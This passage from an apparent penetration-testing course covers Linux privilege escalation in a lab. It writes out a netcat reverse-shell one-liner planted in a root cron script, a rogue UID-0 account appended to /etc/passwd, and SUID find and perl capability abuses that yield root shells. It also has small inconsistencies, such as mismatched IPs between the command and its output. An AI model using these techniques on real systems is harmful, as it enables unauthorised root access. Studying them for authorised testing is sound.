### Listing 489 - Using tcpdump to Perform Password Sniffing
After a few seconds, we are prompted with the root user’s clear-text credentials. Nice!
These two examples provide an entry point for the many avenues available when hunting for leaked credentials. Having covered the low-hanging fruit, next, we’ll explore how to escalate privileges via misconfigured file permissions.

### 17.3 Insecure File Permissions
This Learning Unit covers the following Learning Objectives:
- Abuse insecure cron jobs to escalate privileges
- Abuse insecure file permissions to escalate privileges

In this Learning Unit, we will examine how misconfigured file permissions can lead to different paths for privilege escalation.

#### 17.3.1 Abusing Cron Jobs
Let’s focus on another family of privilege escalation techniques and learn how to leverage insecure file permissions. For this section, we will assume that we have already gained access to our Linux target machine as an unprivileged user.

To leverage insecure file permissions, we must locate an executable file that not only allows us write access but also runs at an elevated privilege level. On a Linux system, the cron time-based job scheduler is a prime target, as system-level scheduled jobs are executed with root user privileges, and system administrators often create scripts for cron jobs with insecure permissions.

For this example, we will SSH into the VM 1 as the `joe` user, providing `offsec` as the password. In a previous section, we demonstrated where to check the filesystem for installed cron jobs on a target system. We could also inspect the cron log file (`/var/log/cron.log`) for running cron jobs:

```bash
joe@debian-privesc:~$ grep "CRON" /var/log/syslog
...
Aug 25 04:56:07 debian-privesc cron[463]: (CRON) INFO (pidfile fd = 3)
Aug 25 04://04:56:07 debian-privesc cron[463]: (CRON) INFO (Running @reboot jobs)
Aug 25 04:57:01 debian-privesc CRON[918]: (root) CMD (/bin/bash /home/joe/.scripts/user_backups.sh)
Aug 25 04:58:01 debian-privesc CRON[1043]: (root) CMD (/bin/bash /home/joe/.scripts/user_backups.sh)
Aug 25 04:59:01 debian-privesc CRON[1223]: (root) CMD (/bin/bash /home/joe/.scripts/user_backups.sh)
```

**Listing 490 - Inspecting the cron log file**

It appears that a script called `user_backups.sh` under `/home/joe/` is executed in the context of the root user. Judging by the timestamps, it seems that this job runs once every minute.

Since we know the location of the script, we can inspect its contents and permissions:

```bash
joe@debian-privesc:~$ cat /home/joe/.scripts/user_backups.sh
#!/bin/bash
cp -rf /home/joe/ /var/backups/joe/
joe@debian-privesc:~$ ls -lah /home/joe/.scripts/user_backups.sh
-rwxrwxrw- 1 root root 49 Aug 25 05:12 /home/joe/.scripts/user_backups.sh
```

**Listing 491 - Showing the content and permissions of the `user_backups.sh` script**

The script itself is fairly straightforward: it simply copies the user’s home directory to the backups subdirectory. The permissions of the script reveal that every local user can write to the file.

Since an unprivileged user can modify the contents of the backup script, we can edit it and add a reverse shell one-liner. If our plan works, we should receive a root-level reverse shell on our attacking machine after, at most, a one-minute period.

```bash
joe@debian-privesc:~$ cd .scripts
joe@debian-privesc:~/.scripts$ echo >> user_backups.sh
joe@debian-privesc:~/.scripts$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.118.2 1234 >/tmp/f" >> user_backups.sh
joe@debian-privesc:~/.scripts$ cat user_backups.sh
#!/bin/bash
cp -rf /home/joe/ /var/backups/joe/
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.0.4 1234 >/tmp/f
```

**Listing 492 - Inserting a reverse shell one-liner in `user_backups.sh`**

All we have to do now is set up a listener on our Kali Linux machine and wait for the cron job to execute:

```bash
kali@kali:~$ nc -lnvp 1234
listening on [any] 1234 ...
connect to [192.168.118.2] from (UNKNOWN) [192.168.50.214] 57698
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
```

**Listing 493 - Getting a root shell from our target**

As shown in the previous listing, the cron job did execute, as well as the reverse shell one-liner. We have successfully elevated our privileges and have access to a root shell on the target. Although this was a simple example, it is not uncommon to find similar situations in the field, as administrators are often more focused on pushing systems into production rather than securing script file permissions.

#### 17.3.2 Abusing Password Authentication
Unless a centralized credential system such as Active Directory or LDAP is used, Linux passwords are generally stored in `/etc/shadow`, which is not readable by normal users. Historically, however, password hashes, along with other account information, were stored in the world-readable file `/etc/passwd`. For backwards compatibility, if a password hash is present in the second column of an `/etc/passwd` user record, it is considered valid for authentication and takes precedence over the respective entry in `/etc/shadow`, if available. This means that if we can write into `/etc/passwd`, we can effectively set an arbitrary password for any account.

Let’s demonstrate this. In a previous section, we showed that our Debian client may be vulnerable to privilege escalation due to the fact that the `/etc/passwd` permissions were not set correctly. To escalate our privileges, let’s add another superuser (`root2`) and the corresponding password hash to `/etc/passwd`. We will first generate the password hash using the `openssl` tool and the `passwd` argument. By default, if no other option is specified, `openssl` will generate a hash using the crypt algorithm, a supported hashing mechanism for Linux authentication.

The output of the `OpenSSL passwd` command may vary depending on the system executing it. On older systems, it may default to the DES algorithm, while on some newer systems, it could output the password in MD5 format.

Once we have the generated hash, we will add a line to `/etc/passwd` using the appropriate format:

```bash
joe@debian-privesc:~$ openssl passwd w00t
Fdzt.eqJQ4s0g
joe@debian-privesc:~$ echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
joe@debian-privesc:~$ su root2
Password: w00t
root@debian-privesc:/home/joe# id
uid=0(root) gid=0(root) groups=0(root)
```

**Listing 494 - Escalating privileges by editing `/etc/passwd`**

As shown in Listing 494, the `root2` user and the `w00t` password hash in our `/etc/passwd` record were followed by the user ID (UID) zero and the group ID (GID) zero. These zero values specify that the account we created is a superuser Linux account. Finally, to verify that our modifications were valid, we used `su` to switch our standard user to the newly-created `root2` account, then issued the `id` command to show that we indeed have root privileges.

Even though finding `/etc/passwd` world-writable might seem unlikely, many organizations implement hybrid integrations with third-party vendors that may compromise security for easier usability.

### 17.4 Insecure System Components
This Learning Unit covers the following Learning Objectives:
- Abuse SUID programs and capabilities for privilege escalation
- Circumvent special sudo permissions to escalate privileges
- Enumerate the system’s kernel for known vulnerabilities, then abuse them for privilege escalation

In this Learning Unit, we will explore how misconfigured system applications and permissions can also lead to elevation of rights.

#### 17.4.1 Abusing Setuid Binaries and Capabilities
As we anticipated earlier in this Module, when not properly secured, setuid binaries can lead to attacks that elevate privileges.

Before attempting the actual exploitation technique, let’s review the purpose behind a setuid binary using a brief example. When a user or a system-automated script launches a process, it inherits the UID/GID of its initiating script: this is known as the real UID/GID.

As previously discussed, user passwords are stored as hashes within `/etc/shadow`, which is owned and writable only by root (uid=0). How, then, can non-privileged users access this file to change their own password?

To circumvent this issue, the effective UID/GID was introduced, which represents the actual value being checked when performing sensitive operations.

To better demonstrate this concept, let’s analyze the `passwd` program, which is responsible for changing the password for the user executing it. On the Debian lab machine, we’ll connect as `joe` and execute the `passwd` command without typing anything afterwards, so that the process remains active in memory.

```bash
joe@debian-privesc:~$ passwd
Changing password for joe.
Current password:
```

**Listing 495 - Executing the `passwd` program**

Leaving the program in standby, let’s open another shell as `joe` to further inspect the process. To find the PID (process ID) of the `passwd` program, we can list all processes and filter the output based on the target name:

```bash
joe@debian-privesc:~$ ps u -C passwd
USER   PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root  1932  0.0  0.1  9364  2984 pts/0    S+   01:51   0:00 passwd
```

**Listing 4496 - Inspecting `passwd`’s process credentials**

Interestingly, `passwd` is running as the root user: this is needed for it to access and modify `/etc/shadow`.

We can also inspect the real UID and effective UID assigned for the process by inspecting the `proc` pseudo-filesystem, which allows us to interact with kernel information. Using the `passwd`'s PID (1932) from the previous output, let’s inspect the content at `/proc/1932/status`, which provides a summary of the process attributes:

```bash
joe@debian-privesc:~$ grep Uid /proc/1932/status
Uid: 1000 0 0 0
```

**Listing 497 - Inspecting `passwd`’s process credentials**

Filtering by the “Uid” keyword returns four parameters that correspond to the real, effective, saved set, and filesystem UIDs. In this case, the Real UID value is 1000, which is expected as it belongs to `joe`. However, the other three values, including the effective UID, equal the root’s ID 0: let’s consider why.

Under normal circumstances, all four values would belong to the same user who launched the executable. For instance, the `bash` process for `joe` (PID 1131 in this case) has the following values:

```bash
joe@debian-privesc:~$ cat /proc/1131/status | grep Uid
Uid: 1000 1000 1000 1000
```

**Listing 498 - Inspecting `passwd`’s process credentials**

The `passwd` binary behaves differently because the binary program has a special flag named Set-User-ID, or SUID in short. Let’s inspect it:

```bash
joe@debian-privesc:~$ ls -asl /usr/bin/passwd
64 -rwsr-xr-x 1 root root 63736 Jul 27 2018 /usr/bin/passwd
```

**Listing 499 - Revealing the SUID flag in the `passwd` binary application**

The SUID flag is depicted with the `s` flag in the above output. This flag can be configured using the `chmod u+s` command, and it sets the effective UID of the running process to the executable owner’s user ID - in this case, root’s.

Using this technique results in a legitimate and constrained privilege escalation, and because of this (as we’ll learn shortly), the SUID binary must be bug-free to avoid any misuse of the application.

As a practical example, once we’ve completed manual or automated enumeration, we’ll have discovered that the `find` utility is misconfigured and has the SUID flag set.

We can quickly abuse this vulnerability by running the `find` program to search any well-known file, like our own Desktop folder. Once the file is found, we can instruct `find` to perform any action through the `-exec` parameter. In this case, we want to execute a bash shell along with the `Set Builtin` `-p` parameter that prevents the effective user from being reset.

```bash
joe@debian-privesc:~$ find /home/joe/Desktop -exec "/usr/bin/bash" -p \;
bash-5.0# id
uid=1000(joe) gid=1000(joe) euid=0(root)
groups=1000(joe),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),112(bluetooth),116(lpadmin),117(scanner)
bash-5.0# whoami
root
```

**Listing 500 - Getting a root shell by abusing SUID program**

After running the command, we’ve obtained a root shell and observed that although the UID still belongs to `joe`, the effective user ID is from root.

Another set of features subject to privilege escalation techniques are Linux capabilities. Capabilities are extra attributes that can be applied to processes, binaries, and services to assign specific privileges normally reserved for administrative operations, such as traffic capturing or adding kernel modules. Similarly to setuid binaries, if misconfigured, these capabilities could allow an attacker to elevate their privileges to root.

To demonstrate these risks, let’s try to manually enumerate our target system for binaries with capabilities. We are going to run `getcap` with the `-r` parameter to perform a recursive search starting from the root folder `/`, filtering out any errors from the terminal output.

```bash
joe@debian-privesc:~$ /usr/sbin/getcap -r / 2>/dev/null
/usr/bin/ping = cap_net_raw+ep
/usr/bin/perl = cap_setuid+ep
/usr/bin/perl5.28.1 = cap_setuid+ep
/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```

**Listing 501 - Manually Enumerating Capabilities**

The two `perl` binaries stand out as they have setuid capabilities enabled, along with the `+ep` flag specifying that these capabilities are effective and permitted.

Even though they seem similar, capabilities, setuid, and the setuid flag are located in different places within the Linux ELF file format.

To exploit this capability misconfiguration, we could check the GTFOBins website. This site provides an organized list of UNIX binaries and how they can be misused to elevate our privileges.

Searching for “Perl” on the GTFOBins website, we’ll find precise instructions for which command to use to exploit capabilities. We’ll use the whole command, which executes a shell along with a few POSIX directives enabling setuid.

```bash
joe@debian-privesc:~$ perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
perl: warning: Setting locale failed.
...
# id
uid=0(root) gid=1000(joe)
groups=1000(joe),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),112(bluetooth),116(lpadmin),117(scanner)
```

**Listing 502 - Getting a root shell through capabilities exploitation**

Great! We managed to gain a root shell via yet another misconfiguration vector.

#### 17.4.2 Abusing Sudo
On UNIX systems, the `sudo` utility can be used to execute a command with elevated privileges. To be able to use `sudo`, our low-privileged user account must be a member of the `sudo` group (on Debian-based Linux distributions). The word “sudo” stands for “Superuser-Do”, and we can think of it as changing the effective user-id of the executed command.

Custom configurations of `sudo`-related permissions can be applied in the `/etc/sudoers` file. We can use the `-l` or `--list` option to list the allowed commands for the current user.

```bash
joe@debian-privesc:~$ sudo -l
[sudo] password for joe:
Matching Defaults entries for joe on debian-privesc:
env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
```

**Listing 503 - Listing `sudo` permissions for the `joe` user**

---

**PWK - Copyright © 2023 OffSec Services Limited. All rights reserved.**
Made in Morocco
Penetration Testing with Kali Linux